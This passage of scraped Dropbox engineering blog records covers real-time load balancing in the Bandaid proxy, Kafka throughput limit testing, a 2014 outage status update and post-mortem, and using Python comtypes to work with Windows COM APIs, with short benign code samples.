Link copied Link copied", "date": "2018-10-10"},
{"website": "Dropbox", "title": "Enhancing Bandaid load balancing at Dropbox by leveraging real-time backend server load information", "author": ["By Haowei Yuan"], "link": "https://dropbox.tech/infrastructure/enhancing-bandaid-load-balancing-at-dropbox-by-leveraging-real-time-backend-server-load-information", "abstract": "Background: Request Load Balancing New Challenges in Load Balancing Enhancing Bandaid Load Balancing Discussion Conclusion and Future Work Layer-7 load balancing (LB) is a core building block to scale today’s web services. In an earlier post, we introduced Bandaid , the service proxy we built in house at Dropbox that load balances the vast majority of our user requests to backend services. More balanced load distribution among backend servers is desirable because it improves the performance and reliability of our services which benefits our users. Our Traffic/Runtime team recently explored leveraging real-time load information from backend servers to make better load balancing decisions in Bandaid. In this post, we will share the experiences and results, as well as discussing load balancing in general. It’s worth noting that the main idea we employed in this work has been presented in Netflix’s article Rethinking Netflix’s Edge Load Balancing . When we first read their post while working on this project, it was encouraging to see a similar approach being explored, and an interesting technical problem that attracts engineers in this field. By sharing our experiences and results obtained from the Dropbox production environment, we hope to contribute an additional data point showing the effectiveness of these approaches and highlight new challenges in load balancing. Background: Request Load Balancing At Dropbox, our web services serve millions of requests and terabits of network traffic per second. To keep these services scalable, we perform load balancing at multiple stages so that the fanout at each stage permits us to employ more resources (network devices, physical machines, containers, etc.) in the upstream direction, where the cost of processing each request in general increases. a user request goes through multiple load balancing layers before reaching backend services The figure above shows the load balancing stages a Dropbox user request goes through before it reaches backend services where application logics are executed. The Global Server Load Balancer (GSLB) distributes a user request to one of our 20+ Point of Presences (PoPs) via DNS. Within each PoP, TCP/IP (layer-4) load balancing determines which layer-7 load balancer (i.e., edge proxies) is used to early-terminate and forward this request to data centers. Inside a data center, Bandaid is a layer-7 load balancing gateway that routes this request to a suitable service. In this post, we focus on layer-7 load balancing in Bandaid. Backend services (or application servers) are typically less performant compared with load balancers and contribute to the majority of request processing time. As a result, a better backend load distribution provided by Bandaid will improve the performance and reliability of our services. New Challenges in Load Balancing Load balancing in the networking area has been well studied and many load balancing methods exist. In this section, we first review the traditional load balancing methods and then discuss the challenges these methods face in a cloud environment where load balancing is performed distributedly. At the end, we present several high-level approaches to tackle these challenges. Simple load balancing methods include random and round-robin , where LB instances determine the number of requests sent to each server solely based on the properties of the scheduling algorithms. These methods work well for basic use cases, however, the actual load distribution (load as in either CPU or thread utilization) is also affected by the processing time differences among requests. As an example, even with round-robin , where numbers of requests sent to each server are balanced, sending five low-cost requests to server A and sending five high-cost requests to server B will result in very different loads on these two servers. To address this issue, more advanced methods, such as least-connections , latency-based LB , and random N choices , are introduced where load balancers maintain local states of observed active request number, connection number, or request process latencies for each backend server so these load and performance information are taken into consideration in load balancing logics. Bandaid supports a rich set of load balancing methods, and we have shown the benefits of more advanced methods in the previous post. load balancing is performed distributedly in today’s cloud environment The existing load balancing methods are mostly analyzed with the assumption that only a single (likely hardware-based) load balancer is used to handle all the requests. However, in today’s cloud-based web service infrastructure, it is common to have tens or hundreds of software-based layer-7 load balancer instances routing requests distributedly to backend servers. As a result, there are new challenges for the traditional LB methods in real-world use cases. The local states stored in each LB instance track only the loads introduced from this specific instance and do not represent the real-time backend load. As a result, LB instances perform optimizations with local and often inaccurate information instead of global knowledge. Each LB instance may receive unequal amount of requests from downstream and therefore adds different amount of loads to backend servers. When the number of backend servers is large, LB instances may be configured with only subsets of the backend servers. Picking the right subset for each LB is challenging and basic methods such as randomly selecting subsets could result in skewed server distribution to load balancers. Processing time on a backend server varies for each request depending on the services and logics involved, making it challenging to predict server loads. To tackle these challenges, a general direction is to leverage real-time metrics (such as server load information) to optimize load balancing decisions. Fortunately, a lot of performance and load information are readily available in the application layer, allowing us to follow this direction in practice. Several high-level approaches are listed as follows. Centralized controller. A centralized controller can dynamically schedule load distribution based on real-time request rates and backend server loads. This approach requires a data collection pipeline to gather information, advanced algorithms in the controller to optimize load distribution, and an infrastructure to distribute load balancing policies to LB instances. Shared states. States can be shared or exchanged across LB instances so that the information stored is closer to the real-time server status, however, keeping these states in sync at request rates can be challenging and complicated. Piggybacking server-side information in response messages. Instead of trying to aggregate stats based on local information, we could embed server-side information in response messages (e.g., stored in HTTP headers) to make it available on load balancers. Additionally, active probing (i.e., proactively sending a request from the load balancer to a server) can be introduced to force a refresh of the load information if necessary. These approaches come with different pros and cons. In the next section, we discuss our Bandaid load balancing setup in production and how we took the third approach to enhance its load balancing performance. Enhancing Bandaid Load Balancing As the service proxy at Dropbox, Bandaid is responsible for load balancing the vast majority of our user requests to backend services. Because of the high request rates, the Bandaid production deployment consists of a large number of instances to handle the load, making itself a truly distributed load balancing layer. Bandaid, the service proxy at Dropbox Although backend services share the same Bandaid deployment, resources can be logically isolated at service level (such as upstream workers, read more in the previous post ). A specific load balancing method is configured for each service to work better with its workload characteristics. Previously, we used random N choices (where N=2 in most cases) based on numbers of active requests for most of our services. This LB method showed benefits compared with round-robin and least-connections , but loads among backend servers could still differ considerably, and some backend servers could be fully utilized at peak load. Although the impact of this behavior can be mitigated by increasing the number of servers or allow more aggressive retries from Bandaid (when the request is safe to retry), we started to look into better load balancing solutions. Our Design We considered the approaches discussed earlier and decided to start with the third one because it was simpler to implement and worked well with the random N choices LB method that Bandaid already supported. Additionally, there are a number of factors (such as our configurations or traffic patterns) that make our problem easier to solve. Bandaid Each Bandaid instance receives roughly the same number of requests (thanks to our downstream LB configurations), which reduces one factor of consideration. We have services that have Bandaid configured to send requests to all backend servers as well as ones where Bandaid is configured with randomly selected subsets of servers. Hence, we can easily validate the effectiveness of the solution in both scenarios. Backend servers (for each service) Each backend server is already configured with a maximum number of requests that can be concurrently served, and the number of active requests is also tracked in the server. As a result, it was straightforward to define the capacity and utilization of a backend server. The backend servers have homogeneous configurations, making it simpler to reason about load balancing among them. We believe the design should also work for heterogeneous configurations and will experiment with this as one of our future projects. Traffic patterns Because of the high QPS of our services, passively collecting piggybacked load information in response messages is sufficient to keep the stored information fresh and we do not have to implement active probing. In our approach, each Bandaid instance still makes random N choice decisions, but instead of using the number of locally observed active requests as the metric when picking servers, now each server has a score to be used for this purpose. The scores are computed based on the following information. Server utilization The server utilization is defined as the number of active requests over the maximum number of requests that can be concurrently processed at each server, ranging from 0.0 to 1.0. The utilization value is computed and stored in the X-Bandaid-Utilization header when a response is about to be sent to Bandaid. The figure below shows an example of the response message flow. piggybacking server utilization in response headers Handling HTTP errors Server side errors (with HTTP status code 5xx) need to be taken into consideration, otherwise when a server fast fails requests, it may attract and fail more requests than expected due to the perceived lower load. In our case, we keep track of the timestamp of the latest observed error, and an additional weight is added to the score if the error happened recently. Stats decay Because we haven’t implemented active probing, once Bandaid observes a high utilization value for a server, it will be less likely to send more requests to that server. Consequently, the stored server utilization value could get stuck and become stale. To address this, we introduced stats decay so the contribution of the stored utilization value decreases as time passes by. The decay function is defined as an inverted sigmoid curve , where T is a constant that represents the duration to reach sigmoid’s midpoint and is the elapsed time since the stats have been recorded. The score of a server is determined based on a function that computes the weighted sum of information listed above as well as a locally tracked active request number. In production, we rely more heavily on the server utilization value than other variables. Performance Results To rollout the new load balancing method, we first deployed changes in backend servers so that server utilization is correctly reported and added to HTTP responses. Then we deployed the Bandaid cluster and started to enable the new LB method service by service, starting from the least risky ones. We tuned the weights in the score function during the initial testing, then the same configuration was applied for the rest of the services. To evaluate the performance, we chose the distribution of total request processing time among backend servers as the metric because it represents the accumulated amount of time that a backend server is busy and serving some request. Note that this metric essentially reflects the number of active requests on servers, and we preferred the former because it is measured and reported more reliably than the number of active requests. Results for a service without backend server subsetting The figure below shows the distribution of total request processing time and total number of requests among backend servers for a service when we applied the new load balancing method. Each curve on the figure corresponds to the data series for a backend server. For this specific service, each Bandaid instance is configured with all backend servers, so subsetting is not involved. As can be seen, the total request processing time became more balanced (i.e., the spread became narrower) as we switched to the new LB method. In term of number of requests being processed at each server, the spread actually became wider in order to compensate the fact that requests took various amount of time to finish. Results for a service with backend server subsetting For a service where subsetting was enabled, we also observed improved load distribution with the new LB method. In our case, the subset of backend servers for each Bandaid instance were selected randomly, and even though the subset size was large, the overall server to balancer assignments were not balanced, indicated by the wide spread of request arrival rates at the servers. As shown on the figure below, switching to the new LB method also made request arrival rates more balanced. Exploring alternative solutions to better improve subsetting is something we plan to work on in the future. more balanced load distribution for a service with subsetting (x-axis time duration: 48 hours) Discussion In this section, we discuss load balancing for service-oriented architecture (SOA) and how to leverage real-time metrics to optimize system performance. Load balancing in service-oriented architecture At Dropbox, we are in the process of moving from a monolith towards a service-oriented architecture. Our internal services do not rely on a dedicated load balancing layer (i.e., server-side load balancing) when they communicate with each other but rather each client directly load balances requests across a subset of upstream servers (i.e., client-side load balancing). To some extent, Bandaid load balancing (i.e., a server-side load balancing cluster) is a special case of client-side load balancing, and the approach we took for improving Bandaid load balancing could potentially be applied to our SOA framework. As for related work, Google presents their load balancing approaches comprehensively in the Load Balancing in the Datacenter chapter of the Google SRE book. For those who are interested in the issues with subsetting, this chapter also discusses deterministic subsetting, a desirable feature for load balancing use cases. Leverage real-time metrics to optimize system performance The core concept of our work is to leverage real-time information to make better load balancing decisions. We chose to piggyback the server load information in HTTP responses because it was simple to implement and worked well with our setup. Netflix presents a similar approach to optimize load balancing for their edge gateway. Google also discusses a solution to send server-side information to clients in response messages, but weighted round robin is used as the client-side load balancing method instead of random N choices . With the rich set of metrics reported at the application layer, it will also be possible to gather and process all related real-time information in a centralized controller or orchestrator to make more sophisticated optimizations. Although we focus on layer-7 load balancing in this post, the same concept can be applied to various system performance optimization problems. Conclusion and Future Work Traditional load balancing methods face new challenges in real-world use cases where load balancing is performed distributedly via many load balancer instances. In this post, we discuss these challenges and general approaches to address them. We also present our solution to enhance load balancing in Bandaid, the Dropbox service proxy. We demonstrate the effectiveness of the implementation by sharing the improved backend server load distribution obtained from Dropbox production workload. The load balancing method presented in this post has been running in our production environment for several months. In the next steps, we are looking into testing the new LB method with heterogeneous backend server configurations and improving load balancing in our SOA framework. If you are interested in high-performance packet processing, intelligent load balancing, grpc-based service mesh, or solving new challenges in scalable networked systems in general, we’re hiring! // Tags Infrastructure Service Proxy Service Oriented Architecture Performance Bandaid // Copy link Link copied Link copied", "date": "2019-09-18"},
{"website": "Dropbox", "title": "Finding Kafka’s throughput limit in Dropbox infrastructure", "author": ["Peng Kang"], "link": "https://dropbox.tech/infrastructure/finding-kafkas-throughput-limit-in-dropbox-infrastructure", "abstract": "Test platform What affects the workload? Traffic model Automate the testing Result Leverage for Future work Wrap up Apache Kafka is a popular solution for distributed streaming and queuing for large amounts of data. It is widely adopted in the technology industry, and Dropbox is no exception. Kafka plays an important role in the data fabric of many of our critical distributed systems: data analytics, machine learning, monitoring, search, and stream processing ( Cape ), to name a few. At Dropbox, Kafka clusters are managed by the Jetstream team, whose primary responsibility is to provide high quality Kafka services. Understanding Kafka’s throughput limit in Dropbox infrastructure is crucial in making proper provisioning decision for different use cases, and this has been an important goal for the team. Recently, we created an automated testing platform to achieve this objective. In this post, we would like to share our method and findings. Test platform The figure above illustrates the setup of our test platform for this study. We use Spark to host Kafka clients, which allows us to produce and consume traffic at an arbitrary scale. We set up three Kafka clusters of different sizes so that tuning cluster size is as simple as redirecting traffic to a different destination. We created a Kafka topic to generate the producing and consuming traffic for the test. For the sake of simplicity, we spread the traffic evenly across brokers. To achieve that, we created the testing topic with 10 times as many partitions as the number of brokers. Each broker is leader for exactly 10 partitions. Because writing to a partition is sequential, having too few partitions per broker can result in write contention, which limits the throughput. Based on our experiments, 10 is a good number to avoid letting write contention become throughput bottleneck. Because of the distributed nature of our infrastructure, the clients are in different regions of the United States. Given that our test traffic is well below the limit of Dropbox’s network backbone, it should be safe to assume that limit found for cross region traffic also applies to local traffic. What affects the workload? There is a rich set of factors that can affect a Kafka cluster’s workload: number of producers, number of consumer groups, initial consumer offsets, message per second, size of each message, and the number of topics and partitions involved, to name a few. The degree of freedom for parameter setting is high. Therefore, it’s necessary for us to find the dominant factors, so that test complexity can be reduced to a practical level. We explored different combinations of parameters that we considered relevant. Unsurprisingly, we concluded that the dominant factors to consider are the basic components of throughout: the number of messages per second ( mps ) produced and the byte size per message ( bpm ). Traffic model We took a formal approach to understanding Kafka’s limits. For a specific Kafka cluster, there is an associated traffic space. Each point in that multidimensional space corresponds to a unique traffic pattern that can be applied to Kafka, and it’s represented by a vector of parameters: < mps , bpm , # producers , # consumer groups , # topics , …>. All traffic patterns that don’t cause Kafka to overload form a closed subspace, and its surface will be the Kafka cluster’s limit. For our initial test, we chose mps and bpm as the basis of the limit, so the traffic space is reduced to a 2D plane. The set of acceptable traffic forms a closed area. Finding Kafka limit is equivalent to plotting this area’s boundary. Automate the testing In order to plot the boundary with reasonable accuracy, we need to conduct hundreds of experiments with different settings, which is impractical to do manually. We therefore designed an algorithm to run all the experiments without human intervention. Overload indicator It’s critical to find a set of indicators which allows for programmatically judging Kafka’s healthiness. We explored a wide range of candidate indicators, and landed on a small set of the following indicators: IO thread idle below 20%: this means the pool of worker threads used by kafka for handling client requests are too busy to handle any more workload In-sync replica set changes over 50%: this means when traffic is applied, 50% of the time we observe at least one broker failing to keep up with replicating data from its leader These metrics are also used by Jetstream to monitor Kafka health, and they are the first red flags raised when a cluster is under too much stress. Finding the boundary To find one boundary point, we fix the value in bpm dimension, and tried to push Kafka to overload by changing mps values. The boundary is found when we have an mps value that is safe, and another value close to it that causes overload. We then consider the safe value to be a boundary point. The boundary line is found by repeating this process for a range of bpm values, as is shown below: It’s worth noting that instead of directly tuning mps , we tuned with different numbers of producers having the same produce rate, which is denoted with np . The main reason is that the produce rate of a single producer isn’t straightforward to control because of message batching. In contrast, changing the number of producers allows for linear scaling of the traffic. According to our early exploration, increasing the number of producers alone won’t cause a noticeable load difference to Kafka. We start with finding a single boundary point with binary search. The search starts with a very large window of np [0, max], where max is a value that will definitely cause overload. In each iteration the middle value is chosen to generate traffic. If Kafka is overloaded at this value, then this middle value becomes the new upper bound, otherwise it becomes the new lower bound. The process stops when the window is narrow enough. We then consider the mps value corresponding to the current lower bound to be the boundary. Result We plotted the boundaries for Kafka of different sizes in above graph. Based on this result, we conclude that the maximum throughput we can achieve in Dropbox infrastructure is 60MB/s per broker. It is worth noting that this is a conservative limit, because the content of our test messages are fully randomized to minimize the effect of Kafka’s internal message compression. When traffic reaches its limit, both disk and network are extensively utilized. In production scenarios, Kafka messages usually conform to a certain pattern, as they are often constructed by similar procedures. This gives significant room for compression optimization. We tested an extreme case where messages consist of same character, and observed much higher throughput limits, as disk and network became much less of a bottleneck. Additionally, this throughput limit holds when there are as many as 5 consumer groups subscribing to the testing topic. In another word, this write throughput is achievable when read throughput is 5 times as large. When the number of consumer groups increases beyond 5, write throughput starts to decline as the network becomes the bottleneck. Because the traffic ratio between read and write is much lower than 5 in Dropbox production use cases, the obtained limit is applicable to all production clusters. This result provides guidelines for future Kafka provisioning. Suppose we want to allow up to 20% of all brokers to be offline, then the maximum safe throughput of a single broker should be 60MB/s * 0.8 ~= 50MB/s. With this we can determine cluster size based on estimated throughput of future use cases. Leverage for Future work The platform and automated tester will be a valuable asset to the Jetstream team down the road. When we switch to new hardware, change network configuration, or upgrade Kafka versions, we can simply rerun these tests and obtain the throughput limit in the new setting. We can apply the same methodology to explore other factors that may affect Kafka performance in different ways. Finally, the platform can serve as test bench for Jetstream to simulate new traffic patterns or reproduce issues in an isolated environment. Wrap up In this post we presented our systematic approach to understanding Kafka’s limits. It is important to note that we obtained these results in Dropbox infrastructure, so our numbers may not apply to other Kafka instances due to different hardware, software stack, and network conditions. We hope the technique presented here can be useful for readers to understand their own systems. Many thanks to members of Jetstream: John Watson, Kelsey Fix, Rajiv Desai, Richi Gupta, Steven Rodrigues, and Varun Loiwal. Additionally, special thanks to Renjish Abraham for helping review the results. Jetstream is always looking for engineers who are passionate about large scale data processing using open source technologies. If you are interested in joining, please check out the open positions at Dropbox and reach out to us! // Tags Infrastructure Performance // Copy link Link copied Link copied", "date": "2019-01-30"},
{"website": "Dropbox", "title": "Dropbox Status Update", "author": ["Dropbox Team"], "link": "https://dropbox.tech/infrastructure/dropbox-status-update", "abstract": "UPDATE 1/12 at 7:23pm PT : Dropbox should now be up and running for all of you, but we’re working through a few last issues with the Dropbox photos tab.  More info on our main blog and the latest post here . UPDATE 1/12 at 1:59pm PT : Hi everyone, we wanted to give an update on where things stand. As of this morning at 4:10am PT, nearly all users (over 99%) can access their files on dropbox.com . The Photos tab is still turned off, but you can access your photos via the Files tab on dropbox.com or the desktop client. We’re continuing to make a lot of progress restoring full service to all users, and are doing so in careful steps. About 5% of our users are still experiencing problems syncing from the desktop client, and about 20% of users are having issues accessing Dropbox through our mobile apps. Within a few hours, we’ll be rolling out a change that will further improve things for those users. We’ll give an update after that. Your files have been safe this entire time. Thanks again for your patience. UPDATE 1/12 at 8:48am PT: We’re still seeing service issues for a small number of users. We’ve been working through the night to restore full service as soon as possible and we’ll continue until this is complete. UPDATE 1/11 at 11:16pm PT: We’re continuing to make progress on reducing the number of users experiencing service issues. We’ll keep providing updates here. UPDATE 1/11 at 6:35pm PT: Dropbox is still experiencing lingering issues from last night’s outage. We’re working hard to get everything back up, and want to give you an update. No files were lost in the outage, but some users continue to run into problems using various parts of dropbox.com and our mobile apps. We’re rapidly reducing the number of users experiencing these problems, and are making good progress. We’re also working through some issues specific to photos. In the meantime, we’ve temporarily disabled photo sharing and turned off the Photos tab on dropbox.com for all users. Your photos are safely backed up and accessible from the desktop client and the Files tab on dropbox.com . We know how much you all rely on Dropbox, and we’re sorry for the trouble. Thanks for your patience — we’ll keep you up to date. UPDATE 1/11 at 10:24am PT: We’re still experiencing service issues related to the outage last night. We apologize and are working to get the service fully restored as soon as possible. UPDATE 1/10 at 8:36pm PT: Dropbox site is back up! Claims of leaked user information are a hoax. The outage was caused during internal maintenance. Thanks for your patience! 1/10 at 6:40pm PT: We are aware that the Dropbox site is currently down. This was caused during routine internal maintenance, and was not caused by external factors. We are working to fix this as soon as possible. We apologize for the inconvenience. // Tags Infrastructure // Copy link Link copied Link copied", "date": "2014-01-10"},
{"website": "Dropbox", "title": "Comtypes: How Dropbox learned to stop worrying and love the COM", "author": ["Alicia Chen"], "link": "https://dropbox.tech/infrastructure/adventures-with-comtypes", "abstract": "What is COM? Comtypes Automatic code generation: GetModule A metaclass in the wild Here at Dropbox, we often use Python in uncommon ways. Today, I’ll be writing about a module that few Python users have even heard of before— comtypes . Comtypes is built on top of ctypes and allows access to low level Windows APIs that use COM. This module allows you to write COM-compatible code using only Python. For example, the Dropbox desktop client feature that allows you to upload photos from a camera uses comtypes to access Windows Autoplay. But before we talk about comtypes, we have to talk about COM. What is COM? The Component Object Model is a standard introduced by Microsoft back in 1993. It allows two software components to interact without either one having knowledge of how the other is implemented, even if the components are written in different languages, running in different processes, or running on different machines and different platforms. Many Windows APIs still rely on COM, and occasionally, we have to work with one of them. The camera upload feature we released this year runs on Windows XP, an OS from 10 years ago, as well as Windows 8, an OS that hasn't been released yet. And it does all this using a standard that was created almost 20 years ago. On Windows, COM is both a standard and a service. It provides all the systems and utilities necessary to make inter-component compatibility possible. The standard requires interfaces to be compiled into a binary format that is language agnostic. For this purpose, it includes a specification for its own interface language—the Microsoft Interface Definition Language, aka MIDL—which is compiled into a binary called a type library that is then included inside a runnable such as a .dll or .exe. COM also allows run-time querying of supported interfaces, so that two objects can agree on an interface much like strangers meeting in a foreign country—\"Do you speak IHardwareEventHandler version 2? No? Well, parlez-vous version 1?\" On top of that, it also provides for object reference counting, inter-process marshalling, thread handling, and much more. Without this functionality, a component implementer would have to make sure objects used by a different process are cleaned up eventually, but not while they're still being referenced. She’d have to serialize arguments to pass between components, and figure out how to control access from multi-threaded components into objects that may or may not be thread-safe. COM handles these things for you, but this functionality comes at a cost. It involves a fair amount of complexity, which is unfortunately necessary, and a lot of syntactic convolution, which is just plain unfortunate. Writing an object that uses a COM component, aka a COM client, is difficult. Writing a COM object that other components can use, aka a COM server, can be downright devilish. If you think COM seems like magic, you’re right—it is definitely some sort of black magic. COM requires incantations such as Copy CoRegisterClassObject(\r\n    {0x005A3A96, 0xBAC4, 0x4B0A, {0x94, 0xEA, 0xC0, 0xCE, 0x10, 0x0E, 0xA7, 0x36}},\r\n    NULL,\r\n    CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER,\r\n    REGCLS_MULTIPLEUSE,\r\n    &lpdwRegister\r\n    ); and the use of strange ritual equipment like MIDL compilers. To ensure unambiguity in class and interface identification, everything is referenced by GUIDs, which are undescriptive and unwieldy at best. And when creating a COM server, the sheer number of configuration options at every step of the way can be paralyzing. You have to answer questions such as “Are my threads running in Single Threaded Apartments or Multithreaded Apartments ?” and “What does it mean to set my ThreadingModel to Both instead of Free ?” Understanding these questions requires a lot of COM-specific background knowledge, and most articles about these choices are pages long, and often involve charts, diagrams, and sample code. I came to Dropbox with enough knowledge of COM to squeak by, and still consider myself no more than an advanced novice. If one were to attempt to write pure Python code that used or, heaven forbid, implemented a COM object, one would need to generate and parse the binary type library files that specify COM interfaces, perform all the complex Windows registry rituals, track all the reference counts to COM objects, as well as correctly write the endless syntactical mumbo jumbo. Fortunately for us, the comtypes module exists to abstract (almost) all of this horribleness away from us. Comtypes If COM is black magic, then comtypes is the mysterious witch doctor service that you contract to perform the black magic for you. For simple tasks, everything likely works fine. Unfortunately, if you need to do anything very complex, you run the risk of being left in the dark as to what sort of invocations were performed, only to find the demon knocking on your door. Still, comtypes makes life much easier. When it works well, you can simply feed comtypes the path to the dll or exe of the object you’re trying to use, and then write pretty straightforward code like Copy device_obj = CreateObject(\"PortableDevice.PortableDevice\", IPortableDevice)\r\ncontents = device_obj.Content()\r\nfor item in contents:\r\n    print item This (slightly simplified) sample code allows access to the contents of a camera attached to the computer. The deviceobj is a Python wrapper around a COM object that is actually implemented elsewhere on the system, one that represents a camera we can interface with. Underneath, comtypes will be busy CoCreateInstancing, QueryInterfacing, and wrapping ctypes objects with Python objects for your ease of use. There’s usually no need for you to worry about the million things that are going on underneath. But unfortunately, things don’t work smoothly all the time, so what kind of hackers would we be if we didn’t open it up to see how it works? Automatic code generation: GetModule The magic begins in the comtypes.client module. The handy helper function GetModule will take a binary file like a .tlb or .exe, extract the binary data, and automatically generate Python code that, like a header file, specifies all the interfaces, methods, and structs that you need to use a particular COM object. Anyone’s who’s worked with the Windows API might be familiar with the rabbit-hole of struct and type declarations. A FORMATETC struct, for example, is one that is used in drag and drop APIs. It is declared as two mystery types followed by three 32 bit ints. Further digging will reveal that one of the unknown types is an enum, but the other is another struct involving more unknown types. For it to be usable in Python, you have to break things down into known types without the benefit of importing hundreds of Windows headers. GetModule will do all of these things for you, but the generated code hides the interesting part, the wrapper classes that actually proxy to the real COM objects underneath. So it’s time to dig a little deeper. A metaclass in the wild This brings us to the comtypes class IUnknown , the root of all evil (no joke—check __init__.py :979). In COM, IUnknown is the grandfather of all interfaces, the interface which all other interfaces inherit from. It contains only three functions: Copy // QueryInterface returns a pointer to the interface you are querying for,\r\n// or an error if the object does not implement it\r\nint QueryInterface(InterfaceID refiid, void** ppObjectOut);\r\n \r\n// These methods are used for reference counting\r\nint AddRef();\r\nint Release(); In comtypes land, IUnknown is actually a base class. For any COM interface that you intend to call into— IPortableDevice for example—you must create a class that inherits from IUnknown . All the methods in the interface are declared in the variable _methods_ as tuples, specifying function name, types and names of args and return values. Copy class IPortableDevice(IUnknown):\r\n   _iid_ = GUID('{625e2df8-6392-4cf0-9ad1-3cfa5f17775c}')\r\n   _methods_ = [\r\n       COMMETHOD([], HRESULT, 'Open',\r\n           ( ['in'], LPWSTR, 'pszPnpDeviceID' ),\r\n           ( ['in'], POINTER(IPortableDeviceValues), 'pClientInfo')),\r\n       COMMETHOD([], HRESULT, 'Content',\r\n           ( ['out'], POINTER(POINTER(IPortableDeviceContent)), 'ppContent'))\r\n   ] The class IUnknown itself is actually pretty simple. The magic happens in its metaclass _cominterface_meta , which turns these tuples into bound methods. For the uninitiated, all Python classes are actually objects, and metaclasses are things that make classes . When you declare a class like IPortableDevice that inherits from IUnknown , the metaclass of IUnknown takes COMMETHODs declared above and creates two bound methods: IPortableDevice.Open , which takes in two parameters and returns nothing; and IPortableDevice.Content , which takes no parameters and returns one. These wrapper methods check that calls are made with the appropriate number and type of inputs, a necessity when communicating between untyped, flying-by-the-seat-of-your-pants Python and statically typed, compiled languages like C++. The wrappers then proxy the method calls into an actual COM object that was instantiated under the covers, wrap the return values in Python types, and return them to you, transforming returned error codes into Python exceptions along the way. It’s wonderful, except when it doesn’t work exactly as intended. The most painful such incident brought development to a dead halt for two days. The only symptom was that the program would occasionally crash after reading a bunch of images from a camera. The bug was non-deterministic and no exception was generated. After endless hours of printing and prodding, I finally found the root cause of the problem. In COM, the implementer of an interface typically does AddRef on the object when he creates it so that it is “born” with a reference which is passed to the caller of CreateObject , while the user of the interface is responsible for calling Release when he is done with it. Additional calls to AddRef and Release are only necessary if the user makes copies of the reference to the object. So in comtypes, the __init__ method of a comtypes object does not call AddRef on the COM interface, but deletion does call Release . This in itself is only passingly strange, because it usually works. However, the clever wrapping of COM objects sometimes results in comtypes objects being created unexpectedly, and then also deleted unexpectedly. For example, in the following code Copy # The following is equivalent to the C code\r\n#   IDeviceItem* idevice_item_array = IDeviceItem[10];\r\n#   device-&gt;GetItems(10, &amp;idevice_item_array);\r\nidevice_item_array = (pointer(IDeviceItem) * 10)()\r\ndevice_obj.GetItems(10, idevice_item_array)\r\ndevice_item = idevice_item_array[0] you would expect device_item to be a pointer to an IDeviceItem . Normally, you would have to “dereference” the pointer to get to the item itself, as in Copy # In ctypes, pointer.contents refers to the target of the pointer\r\ndevice_item = idevice_item_array[0].contents\r\ndevice_item.do_something() However, when you index the array, comtypes helpfully transforms idevice_item_array[0] from type pointer(IDeviceItem) to type IDeviceItem , so instead we have Copy # idevice_item_array[0] is already of type IDeviceItem??\r\nidevice_item_array[0].do_something() In the process, it unexpectedly creates an instance of IDeviceItem . More importantly, it unexpectedly destroys an instance of IDeviceItem. So, the following code Copy for i in range(100):\r\n    print idevice_item_array[0] actually crashes Python because it creates and destroys a hundred IDeviceItem objects, resulting in a hundred calls to Release on the real COM object. After the first Release call, the COM object is considered deleted. Whenever the garbage collector for that COM object is triggered, everything explodes. The workaround? Save your reference into a Python object and keep it around. Don’t index your COM object arrays more than once. Copy device_item = idevice_item_array[0]\r\nfor i in xrange(100):\r\n    print device_item This results in exactly one call to Release , which occurs when the Python object deviceitem is destroyed. All of this happened within my first few months at Dropbox, and I barely spoke Python at the time. I learned what a metaclass was before I had fully mastered list slicing syntax. Meanwhile, my counterpart on the Mac camera uploads side was not having the easiest time either. Without the benefit of a compatibility enforcer like COM, he was trying to ferret out why an OS X library was trying to execute Dropbox code as PowerPC assembly on an X86 machine (it’s complicated—the explanatory comment is about fifty lines long). It made me feel a little bit better about dealing with incorrect vtable pointers and bad reference counting. Discovering comtypes was an integral part of the development of the photo feature, and it certainly presented enough excitement to be considered an adventure. In the end, for all the problems I encountered, having comtypes made it much easier to access COM APIs. Reference counting bugs are the price you pay when you work with low-level code, but it certainly would have been much more work to write our own Python wrappers around COM. COM may be difficult to use, and comtypes occasionally frustrating, but with a working knowledge of how to use the first and how to work around unexpected pitfalls in the second, we can plow ahead with future Windows features. In fact, not long after we released the camera feature, we found ourselves again needing to interact with a COM component. With all this knowledge under my hat, I made myself a COM client in no time. It was a glorious victory. // Tags Infrastructure // Copy link Link copied Link copied", "date": "2012-10-04"},
{"website": "Dropbox", "title": "Outage post-mortem", "author": ["Akhil Gupta"], "link": "https://dropbox.tech/infrastructure/outage-post-mortem", "abstract": "On Friday evening our service went down during scheduled maintenance. The service was back up and running about three hours later, with core service fully restored by 4:40 PM PT on Sunday. For the past couple of days, we’ve been working around the clock to restore full access as soon as possible. Though we’ve shared some brief updates along the way, we owe you a detailed explanation of what happened and what we’ve learned. What happened? We use thousands of databases to run Dropbox. Each database has one master and two replica machines for redundancy. In addition, we perform full and incremental data backups and store them in a separate environment. On Friday at 5:30 PM PT, we had a planned maintenance scheduled to upgrade the OS on some of our machines. During this process, the upgrade script checks to make sure there is no active data on the machine before installing the new OS. A subtle bug in the script caused the command to reinstall a small number of active machines. Unfortunately, some master-replica pairs were impacted which resulted in the site going down. Your files were never at risk during the outage. These databases do not contain file data. We use them to provide some of our features (for example, photo album sharing, camera uploads, and some API features). To restore service as fast as possible, we performed the recovery from our backups. We were able to restore most functionality within 3 hours, but the large size of some of our databases slowed recovery, and it took until 4:40 PM PT today for core service to fully return. What did we learn? Distributed state verification Over the past few years our infrastructure has grown rapidly to support hundreds of millions of users. We routinely upgrade and repurpose our machines. When doing so, we run scripts that remotely verify the production state of each machine. In this case, a bug in the script caused the upgrade to run on a handful of machines serving production traffic. We’ve since added an additional layer of checks that require machines to locally verify their state before executing incoming commands. This enables machines that self-identify as running critical processes to refuse potentially destructive operations. Faster disaster recovery When running infrastructure at large scale, the standard practice of running multiple replicas provides redundancy. However, should those replicas fail, the only option is to restore from backup. The standard tool used to recover MySQL data from backups is slow when dealing with large data sets. To speed up our recovery, we developed a tool that parallelizes the replay of binary logs. This enables much faster recovery from large MySQL backups. We plan to open source this tool so others can benefit from what we’ve learned. We know you rely on Dropbox to get things done, and we’re very sorry for the disruption. We wanted to share these technical details to shed some light on what we’re doing in response. Thanks for your patience and support. Akhil Head of Infrastructure // Tags Infrastructure // Copy link Link copied Link copied", "date": "2014-01-12"},
